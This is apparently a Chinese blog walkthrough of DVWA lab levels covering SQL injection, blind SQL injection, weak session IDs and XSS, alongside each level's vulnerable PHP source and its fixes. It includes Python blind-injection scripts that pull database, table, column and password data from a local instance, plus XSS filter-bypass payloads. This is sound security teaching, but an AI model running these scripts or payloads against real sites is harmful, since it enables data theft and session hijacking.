![image-20221004113922839](/images/ctf-web-dvwa/image-20221004113922839.png)



<br>

## High

<img src="/images/ctf-web-dvwa/image-20221004120209155.png" alt="image-20221004120209155" style="zoom:67%;" />

点击链接之后会弹出一个窗口, 在窗口的输入框中输入查询内容, 回显会出现在原页面上

```php
<?php
if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];
    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);     
}
?> 
```

这里的逻辑是, 在主页面点击链接之后,会触发弹窗事件,弹出的窗口是`session-input.php`

![image-20221004120316894](/images/ctf-web-dvwa/image-20221004120316894.png)

然后在窗口的输入框中输入并提交的内容会以POST的方式传给服务器(抓个包看看), 而因为用户与弹窗和与主界面的交互同属一个会话`session`,所以在主页面的php脚本中,可以通过`$_SESSION`变量来访问到. 所以上面代码中, 通过`$_SESSION[ 'id' ]`来访问到了在弹窗中POST的那个名为`id`的变量

后面注入的过程就很简单了,在弹窗中输入Low中的payload,就可以实现注入

<img src="/images/ctf-web-dvwa/image-20221004120854637.png" alt="image-20221004120854637" style="zoom:80%;" />

另外,注意到代码的第6行,在sql语句最后加了`LIMIT 1`,即每次只能显示一条查询结果

但是在payload中,最后的`#`就可以使其失效

<br>

## Impossible

```php
<?php
if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $id = $_GET[ 'id' ];
    // Was a number entered?
    if(is_numeric( $id )) { //检测用户提交的内容是否为纯数字
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); // 准备即将被多次执行的语句,返回一个PDOStatement对象 (预处理)
        $data->bindParam( ':id', $id, PDO::PARAM_INT ); //绑定一个参数(也就是上面的(:id))到指定的变量名
        $data->execute(); //执行语句
        $row = $data->fetch();// 从查询结果中获取下一行

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) { //受上一条语句影响的行数,这里必须行数为1才能继续执行
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}
// Generate Anti-CSRF token
generateSessionToken();
?> 
```

>代码采用了PDO技术(语句可以一次编译预处理多次执行)，**划清了代码与数据的界限**，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。
>
>https://www.runoob.com/php/php-pdo.html

<br>

***

<br>

# SQL盲注

没有任何回显的SQL注入

## Low

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];
    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors
    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?> 
```

<img src="/images/ctf-web-dvwa/image-20221009205253312.png" alt="image-20221009205253312" style="zoom:67%;" />

输入一个id查询，只会告知输入的id存在或者不存在，而不会显示具体数据内容

**尝试进行盲注，如果显示`User ID exists in the database.`则说明语句里给出的命题是成立的**

```
猜库名长度
1' and length(database())=4 #
逐个字母猜库名
1' and substr(database(),1,1)='d
逐个字母猜所有表名
1' and substr((select group_concat(table_name) from information_schema.tables where table_schema='dvwa'),1,1) = 'g
逐个字母猜列名：
1' and substr((select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'), 1, 1) = 'u
逐个字母猜特定列里的数据：
id=1' and substr((select group_concat(password) from users), 1, 1) = '5
```

**因为人工盲注挨个字母来试错很麻烦，所以这里使用脚本来进行盲注**

```python
import requests
import string
chars = string.printable[:]  # 返回所有可打印的字母，数字，符号的集合
# print(chars)
base_url = "http://127.0.0.1:8090/dvwa/vulnerabilities/sqli_blind/?"
session = requests.session()
cookies = {'security': 'low', 'PHPSESSID': '33gvmgr5a5lhjau9n9gq044oqp'}
# 库名长度
def get_dbname_length():
    for dbname_length in range(1, 30):
        url = base_url + "id=1' and length(database())={}%23&Submit=Submit".format(dbname_length)  # %23解码为'#'
        response = session.get(url, cookies=cookies).text
        if "User ID exists in the database" in response:
            print("dbname_length:{}".format(dbname_length))
            break
    # return dbname_length
get_dbname_length()
# 库名
def get_database_name(dbname_length):
    dbname = ''
    for i in range(1, dbname_length + 1):
        for c in chars:
            url = base_url + "id=1' and substr(database(),{},1)='{}'%23&Submit=Submit#".format(i, str(c))
            response = session.get(url, cookies=cookies).text
            if "User ID exists in the database" in response:
                dbname = dbname + str(c)
                break
    print("dbname:{}".format(dbname))
    # return dbname

# 库中的所有表名
get_database_name(4)
def get_tables_name(db_name):
    tables_name = ''
    for i in range(1, 30):
        for c in chars:
            url = base_url + "id=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema='{}'),{},1) = '{}'%23&Submit=Submit#".format(
                db_name, i, str(c))
            # print(url)
            response = session.get(url, cookies=cookies).text
            if "User ID exists in the database" in response:
                print(c)
                tables_name = tables_name + str(c)
                break
    print("tables_name:{}".format(tables_name))
    # return tables_name
get_tables_name("dvwa")
# 表中的所有列名
def get_columns_name(db_name, table_name):
    columns_name = ''
    for i in range(1, 100):
        for c in chars:
            url = base_url + "id=1' and substr((select group_concat(column_name) from information_schema.columns where table_schema = '{}' and table_name = '{}'), {}, 1) = '{}'%23&Submit=Submit#".format(
                db_name, table_name, i, c)
            response = session.get(url, cookies=cookies).text
            if "User ID exists in the database" in response:
                print(c)
                columns_name = columns_name + str(c)
                break
    print("columns_name:{}".format(columns_name))
    # return columns_name
get_columns_name("dvwa", "users")
# 特定列的数据
def get_data(table_name, column_name):
    data = ""
    for i in range(1,60):
        for c in chars:
            url = base_url + "id=1' and substr((select group_concat({}) from {}), {}, 1) = '{}'%23&Submit=Submit#".format(column_name, table_name, i, c)
            response = session.get(url, cookies=cookies).text
            if "User ID exists in the database" in response:
                print(c)
                data = data + c
                break
    print("data in {}:{}".format(column_name, data))
get_data("users", "password")
```

<br>

## Medium

相比于Low，限制了用户的输入，且改为了通过`POST`的方式传参

<img src="/images/ctf-web-dvwa/image-20221009224911053.png" alt="image-20221009224911053" style="zoom:67%;" />

那么从BurpSuite上抓包，并从`POST`的参数处进行注入，获取信息的逻辑和Low里面是一样的，另外要注意的是这里`id`的类型也从字符型变成了数值型

<img src="/images/ctf-web-dvwa/image-20221009224935143.png" alt="image-20221009224935143" style="zoom:67%;" />

源码：

```php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
// 这里mysqli_real_escape_string对单引号进行了转义
    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors
    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }
    //mysql_close();
}
?>
```

还是写脚本来注入： 这里直接使用`substr()`跑不出结果，所以尝试使用ascii码来绕过

另外，由于引号等被转义了，所以由引号包裹的字符串也不能出现在查询语句中，这里可以把原来的字符串换成十六进制的形式，例如`users`换成`0x7573657273`

```python
import requests
import string
chars = string.printable[:]  # 返回所有可打印的字母，数字，符号的集合
# print(chars)
base_url = "http://127.0.0.1:8090/dvwa/vulnerabilities/sqli_blind/"
session = requests.session()
cookies = {'security': 'medium', 'PHPSESSID': '33gvmgr5a5lhjau9n9gq044oqp'}

# 库名长度
def get_dbname_length():
    for dbname_length in range(1, 30):
        post_data = {
            'id': "1 and length(database())={}#".format(dbname_length),
            'Submit': "Submit"
        }
        response = session.post(base_url, cookies=cookies, data=post_data).text
        if "User ID exists in the database" in response:
            print("dbname_length:{}".format(dbname_length))
            break
    # return dbname_length
# get_dbname_length()

# 库名
def get_database_name(dbname_length):
    dbname = ''
    for i in range(1, dbname_length + 1):
        for c in chars:
            post_data = {
                'id': "1 and ascii(substr(database(),{},1))={} #".format(i, ord(c)),
                'Submit': "Submit"
            }
            response = session.post(base_url, cookies=cookies, data=post_data).text
            if "User ID exists in the database" in response:
                print(c)
                dbname = dbname + str(c)
                break
    print("dbname:{}".format(dbname))
    # return dbname
# get_database_name(4)


# 库中的所有表名
def get_tables_name(db_name):
    tables_name = ''
    for i in range(1, 30):
        for c in chars:
            # url = base_url + "id=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema='{}'),{},1) = '{}'%23&Submit=Submit#".format(db_name, i, str(c))
            # print(url)
            # response = session.get(url, cookies=cookies).text
            post_data = {
                'id': "1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema= database()),{},1))={} #".format(i, ord(c)),
                'Submit': "Submit"
            }
            response = session.post(base_url, cookies=cookies, data=post_data).text
            if "User ID exists in the database" in response:
                print(c)
                tables_name = tables_name + str(c)
                break
    print("tables_name:{}".format(tables_name))
    # return tables_name
# get_tables_name("dvwa")

# 表中的所有列名
def get_columns_name(table_name):
    columns_name = ''
    for i in range(1, 100):
        for c in chars:
            # url = base_url + "id=1' and substr((select group_concat(column_name) from information_schema.columns where table_schema = '{}' and table_name = '{}'), {}, 1) = '{}'%23&Submit=Submit#".format(db_name, table_name, i, c)
            # response = session.get(url, cookies=cookies).text
            post_data = {
                'id': "1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name={}),{},1))={} #".format(table_name, str(i), ord(c)),
                'Submit': "Submit"
            }
            response = session.post(base_url, cookies=cookies, data=post_data).text
            if "User ID exists in the database" in response:
                print(c)
                columns_name = columns_name + str(c)
                break
    print("columns_name:{}".format(columns_name))
    # return columns_name
# 这里不能直接传表名的字符串，所以将表名"users"通过ascii码转化成16进制数（使用16进制数代替字符串，保证最终提交到服务器的查询语句中不存在单引号）
# get_columns_name("0x7573657273")


# 特定列的数据 (这个函数暂时跑不出来……没找到原因)
def get_data(table_name, column_name):
    data = ""
    for i in range(1,60):
        for c in chars:
            # url = base_url + "id=1' and substr((select group_concat({}) from {}), {}, 1) = '{}'%23&Submit=Submit#".format(column_name, table_name, i, c)
            # response = session.get(url, cookies=cookies).text
            post_data = {
                'id': "1 and ascii(substr((select group_concat({}) from {}),{},1))={} #".format(column_name, table_name, i, ord(c)),
                # 'id': "1 and ascii(substr((select group_concat(0x70617373776f7264) from 0x7573657273),{},1))={} #".format(i, ord(c)),
                'Submit': "Submit"
            }
            response = session.post(base_url, cookies=cookies, data=post_data).text
            if "User ID exists in the database" in response:
                print(c)
                data = data + c
                break
    print("data in {}:{}".format(column_name, data))
get_data("0x7573657273", "0x70617373776f7264")
# get_data("users", "password")
```



<br>

## High

```php
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];
    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    //Limit限制每次只能显示一条记录，但是这里可以使用#把它注释掉
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?> 
```

这里使用了独立的页面来传递参数`id`,并在主页面中使用`Cookie`来存储`id`的值

<img src="/images/ctf-web-dvwa/image-20221010212119239.png" alt="image-20221010212119239" style="zoom:67%;" />



<img src="/images/ctf-web-dvwa/image-20221010212153295.png" alt="image-20221010212153295" style="zoom:67%;" />

那么可以在Cookie字段处进行注入：

<img src="/images/ctf-web-dvwa/image-20221010212357001.png" alt="image-20221010212357001" style="zoom:67%;" />

那么接下来稍微改动脚本，使用Low中使用的Payload来进行注入就可以了

```python
cookies[id] = payload
response = session.get(url, cookies=cookies).text
```



<br>

## Impossible

```php
<?php
if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();

        // Get results
        if( $data->rowCount() == 1 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    }
}
// Generate Anti-CSRF token
generateSessionToken();

?> 
```

- 采用了PDO技术，划清了代码与数据的界限

- 只有当返回的查询结果数量为一个记录时，才会成功输出，这样就有效预防了暴库

- 利用`is_numeric($id)`函数来判断输入的id是否是数字或数字字符串，满足条件才执行查询语句

- `Anti-CSRF token`机制的加入了进一步提高了安全性，`session_token`是随机生成的动态值，每次向服务器请求，客户端都会携带最新从服务端已下发的`session_token`值向服务器请求作匹配验证，相互匹配才会验证通过

<br>

# Weak_SessionIDs弱会话ID

会话ID用来对会话进行认证，如果用来生成会话ID的加密算法太弱，导致会话ID过于简单，就有被伪造的风险。

## Low

```php
<?php
$html = "";
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
    $_SESSION['last_session_id']++; //这里的会话ID就是从0开始的累加的数字，每次更新就加1
    $cookie_value = $_SESSION['last_session_id'];//会话ID存储在cookie中，用来认证
    setcookie("dvwaSession", $cookie_value);
}
?> 
```

抓包发现每点一次，会话ID的值加１

<img src="/images/ctf-web-dvwa/image-20221011203121816.png" alt="image-20221011203121816" style="zoom:67%;" />

<br>

## Medium

继续抓包：

<img src="/images/ctf-web-dvwa/image-20221011203334655.png" alt="image-20221011203334655" style="zoom:67%;" />

点击了5次，会话ID分别为`1665491533`,`1665491557`,`1665491565`,`1665491573`,`1665491575`这些数字形似时间戳

```php
<?php
$html = "";
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = time();//取当前时间戳作为会话ID，依然容易伪造
    setcookie("dvwaSession", $cookie_value);
}
?>
```

<br>

## High

```php
<?php
$html = "";
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id_high'])) {
        $_SESSION['last_session_id_high'] = 0;
    }
    $_SESSION['last_session_id_high']++;
    $cookie_value = md5($_SESSION['last_session_id_high']); //会话ID的值来自Low的会话ID进行md5加密
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false); //这里其他的参数作用分别是：time()+3600设置cookie的过期时间，也就是从当前开始的3600s；/vulnerabilities/weak_id/是cookie的生效范围；$_SERVER['HTTP_HOST']是cookie的生效域名
}
?> 
```

会话ID的值来自Low的会话ID进行md5加密，但是由简单数加密得到的md5值非常容易被碰撞出来

<img src="/images/ctf-web-dvwa/image-20221011204608467.png" alt="image-20221011204608467" style="zoom:50%;" />

<br>

## Impossible

```php
<?php
$html = "";
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = sha1(mt_rand() . time() . "Impossible"); //拼接字符串随机数+时间戳+“Impossible”，然后再进行SHA1加密
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);
}
?> 
```





# XSS跨站脚本攻击

>XSS,全称`Cross Site Scripting`，即跨站脚本攻击，某种意义上也是一种注入攻击，是指**攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行**，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。**根据恶意代码是否存储在服务器中**，XSS可以分为存储型XSS与反射型XSS
>
>当用户请求某个服务器时, 服务器的响应里会包括网站的html文件,以及js等脚本脚本文件, **网页由用户的浏览器使用js等脚本渲染之后再呈现给用户**. 但用户的浏览器是无脑的, 如果服务器发来的脚本中有恶意内容, 也会被用户的浏览器所渲染执行



## 反射型XSS

>这里**恶意代码是由受害用户发给服务器**的
>
>例如有的网站中, 用户Michael在登录框中输入了自己的用户名登录后, 这个用户名会作为参数以url的形式传给服务器, 服务器会直接取此参数构建返回页面,例如返回的网站会显示 “欢迎Michael”
>
>那么, 攻击者会构造一些包含有恶意代码的链接诱导用户点击. 不知情况的用户点击链接之后, 恶意代码就被包含在请求包里被用户发送给了服务器. 服务器不知道这些参数是有问题的, 仍旧**拿这些个带有恶意代码的参数来构建响应包和响应脚本并发给用户**
>
>最后, 用户浏览器在收到响应包后, 使用这些包含恶意代码的js脚本用来渲染网页, 所以当网页在用户浏览器上呈现时, 这些恶意代码也就被执行了.
>
> 之所以叫反射, 是因为**恶意代码由受害用户发给服务器, 又被服务器反射回用户浏览器执行**

<br>

### Low

<img src="/images/ctf-web-dvwa/image-20221003001922637.png" alt="image-20221003001922637" style="zoom:67%;" />

随便输入一个名字sssss,发现这串字符出现在了请求的url中, 同时页面返回了「Hello sssss」, 这里也就可以知道后端对我们通过url传过去的参数做了处理. 

<img src="/images/ctf-web-dvwa/image-20221003002025102.png" alt="image-20221003002025102" style="zoom:67%;" />

看源码,输入的名字被拼接到了这个位置 <img src="/images/ctf-web-dvwa/image-20221003002449419.png" alt="image-20221003002449419" style="zoom:67%;" />

那么如果这里出现了一个js脚本,它也一定能够被执行, 所以在输入框里提交

```html
<script>alert("114514")</script>
```

果然被执行了:<img src="/images/ctf-web-dvwa/image-20221003002622499.png" alt="image-20221003002622499" style="zoom:67%;" />

提交:

```html
<script>alert(document.cookie)</script>
```

成功返回了cookie的内容<img src="/images/ctf-web-dvwa/image-20221003004410912.png" alt="image-20221003004410912" style="zoom:50%;" />

攻击者可以使用这种方式来窃取用户的cookie等信息



看源码: 就是最简单的拼接, 将`hello+name`作为一个标签拼接到html中,没有任何安全措施

```php
<?php
header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	// Feedback for end user
	$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
?>
```

<br>

### Medium

提交Low中使用的payload发现: 过滤掉了`script`标签

<img src="/images/ctf-web-dvwa/image-20221003143905389.png" alt="image-20221003143905389" style="zoom:67%;" />

代码: 第七行,将script标签替换成空字符串

```php
<?php

header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?> 
```

几种绕过方法:

- **大小写绕过**:

  ```javascript
  <sCriPt>alert("114514")</script>
  ```

- **标签双写绕过**:

  ```javascript
  <scr<script>ipt>alert("114514")</script>
  ```

  里面的`script`标签被过滤掉, 从而外面的"scr"和"ipt"重新拼接成一个完整的标签

- **使用其他可以用来执行js代码标签**

  ```html
  <img src="" onerror="alert(114514)"/>
  <iframe src="" onload="alert(114514)"></iframe>
  ```

  > `onerror`:加载图片时如果出现错误,则执行`oneerror`指定的js代码
  >
  > `onload`:指定页面载入完毕后执行的js代码

  

  <img src="/images/ctf-web-dvwa/image-20221003145513124.png" alt="image-20221003145513124" style="zoom:67%;" />

  **还可以使用data协议来执行代码:** 

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="></object>
上面的base64解码后就是:<script>alert('xss')</script>
```



<br>

### High

```php
<?php
header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?> 
```

**使用正则表达式来过滤, `/i`表示不区分大小写**

`(.*)`: 其中`.`表示任意单个字符,`*`表示匹配前面的表达式零次或者多次. 因此上面的表达式表示在`<script`的每个字符之间还能够匹配任意多个字符.因此, Medium中的前两个方法: 大小写绕过和标签双写绕过就失效了.

但是后两个方法仍然不受限制

```html
<img src="" onerror="alert(114514)"/>
<iframe src="" onload="alert(114514)"></iframe>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="></object>
```

<br>

### Impossible

```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
// Generate Anti-CSRF token
generateSessionToken();

?> 
```

- `htmlspecialchars(字符串)`:将字符串的特殊字符,例如`>`,`<`等转化为HTML实体, 可以**防止其被识别为标签**.预定义的字符包括:

  ```
  & （和号）成为 &amp;
  " （双引号）成为 &quot;
  ' （单引号）成为 '
  < （小于）成为 &lt;
  > （大于）成为 &gt;
  ```

​	所以无论提交什么, `htmlspecialchars(字符串)`都将标签里的大于号和小于号等转换成纯字符,最后输出到页面上

​	<img src="/images/ctf-web-dvwa/image-20221003154022846.png" alt="image-20221003154022846" style="zoom:67%;" />

- 注意到上面url里还提交了一个`user_token`参数. 这里还加入了`Anti-CSRF token`，防止`csrf`攻击

暂时没有想到怎么利用...





<br>

## 存储型XSS

> 攻击者通过评论区,留言板这样的输入渠道提交恶意js脚本代码. 这些信息如果不被过滤的话,往往会被存储到服务器的数据库等位置, 当其他用户访问网站时, 这些恶意代码可能被激活执行, 从而进行窃取用户cookie等操作. 

### Low

<img src="/images/ctf-web-dvwa/image-20221003004614083.png" alt="image-20221003004614083" style="zoom:50%;" />



抓包发现,这里是以POST的方式提交参数:<img src="/images/ctf-web-dvwa/image-20221003005251565.png" alt="image-20221003005251565" style="zoom:67%;" />

每次提交的内容都会出现在下面<img src="/images/ctf-web-dvwa/image-20221003005325165.png" alt="image-20221003005325165" style="zoom:67%;" />

那么这些内容应该是被存储到了服务器的数据库里,每次加载此网页是,都会从数据库的某个表中查询其中的所有记录,并列在网页上.

查看源码,发现这些内容都被拼接到了HTML中:

<img src="/images/ctf-web-dvwa/image-20221003005603884.png" alt="image-20221003005603884" style="zoom:67%;" />

那么提交js代码试试:

<img src="/images/ctf-web-dvwa/image-20221003005516112.png" alt="image-20221003005516112" style="zoom:67%;" />

能够执行, 后面**每次打开这个网页都会执行这一句代码**,因为这句代码已经被存储到了数据库里, 每次服务器返回网页的时候都会从数据库中取出这句代码并拼接到HTML文件中.

<img src="/images/ctf-web-dvwa/image-20221003005626081.png" alt="image-20221003005626081" style="zoom:67%;" />

<img src="/images/ctf-web-dvwa/image-20221003005827598.png" alt="image-20221003005827598" style="zoom:67%;" />

看源码:

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );
	// Sanitize message input
	$message = stripslashes( $message );
	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	// Sanitize name input
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Update database　将用户输入的内容插入数据库中
	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	//mysql_close();
}
?>
```

<br>

## DOM型XSS

>`文档对象模型 (DOM) `是 HTML 和 XML 文档的编程接口。它提供了对文档的结构化的表述，并定义了一种方式可以使**从程序中对该结构进行访问，从而改变文档的结构，样式和内容**。DOM 将文档解析为一个由节点和对象（包含属性和方法的对象）组成的结构集合。简言之，它会**将 web 页面和脚本或程序语言连接起来**。
>
>一个 web 页面是一个文档。这个文档可以在浏览器窗口或作为 HTML 源码显示出来。但上述两个情况中都是同一份文档。文档对象模型（DOM）提供了对同一份文档的另一种表现，存储和操作的方式。**DOM 是 web 页面的完全的面向对象表述，它能够使用如 JavaScript 等脚本语言进行修改**。
>
>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的`Document object`文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，**客户端的脚本程序可以通过DOM来动态修改页面内容**，**从客户端获取DOM中的数据并在本地执行**。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。

通过JS来访问及操作网页元素对象例如:

```javascript
var x = document.getElementsByTagName("P"); //返回网页中所有 <p> 元素
var y = document.getElementById("main"); //查找并返回所有id='main'的元素
var z = document.getElementsByClassName("intro"); //查找所有类为"intro"的元素
var referer = document.referrer; // 返回用户是从哪个页面跳转过来的, 如果用户是直接输入url访问的,那么此对象为空字符串
```

<img src="/images/ctf-web-dvwa/image-20221003121501871.png" alt="image-20221003121501871" style="zoom:67%;" />

<br>

### Low

这里主要从页面源码入手了:

<img src="/images/ctf-web-dvwa/image-20221003122811568.png" alt="image-20221003122811568" style="zoom:67%;" />

修改语言时执行的脚本如下:(直接写在页面源码里的,在前端浏览器上执行)

```html
<div class="vulnerable_code_area">
 		<p>Please choose a language:</p>
		<form name="XSS" method="GET">
			<select name="default"> 
				<script>
					if (document.location.href.indexOf("default=") >= 0) {
						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
						document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
						document.write("<option value='' disabled='disabled'>----</option>");
					}			    
					document.write("<option value='English'>English</option>");
					document.write("<option value='French'>French</option>");
					document.write("<option value='Spanish'>Spanish</option>");
					document.write("<option value='German'>German</option>");
				</script>
			</select>
			<input type="submit" value="Select" />
		</form>
</div>
```

>`select`用于创建下拉列表, `name`控制下拉列表的名称,
>
>`option`标签控制下拉列表中的每一项,其中`value`属性表示该项被选中的话,表单提交时传给服务器的值, 开始标签 `option` 与结束标签 `option` 之间的内容是浏览器显示在下拉列表中的内容

这里每次打开此页面时,创建下拉表单是通过js脚本来完成的, 每次都根据之前下拉表单提交的内容来使用`document.write`来创建新的`</option>`对象,也就是下拉菜单的每一项

如果是第一次打开此网页,url和下拉菜单是这样的: (通过上面代码的11-14行创建了下拉菜单)

<img src="/images/ctf-web-dvwa/image-20221003125659999.png" alt="image-20221003125659999" style="zoom: 67%;" />

随便选择一个再点击提交后, 发现URL和下拉菜单都发生了变化,除了执行11-14行以外,还通过了if判断执行了7-9行的代码

<img src="/images/ctf-web-dvwa/image-20221003125416381.png" alt="image-20221003125416381" style="zoom: 67%;" />



这里`lang`变量的值通过`document.location.href`函数来从URL中获取到(url中的default变量)

这里注意到第8行直接将lang变量解码(来自URL中的`default`变量)没有经过任何处理后就拼接到了`option`标签里,所以我们就可以在URL中的`default`变量里插入恶意代码. 这些恶意代码会被第8行的`document.write`写入到页面中并执行:

<img src="/images/ctf-web-dvwa/image-20221003130407231.png" alt="image-20221003130407231" style="zoom: 67%;" />

被写入页面的DOM节点中了:

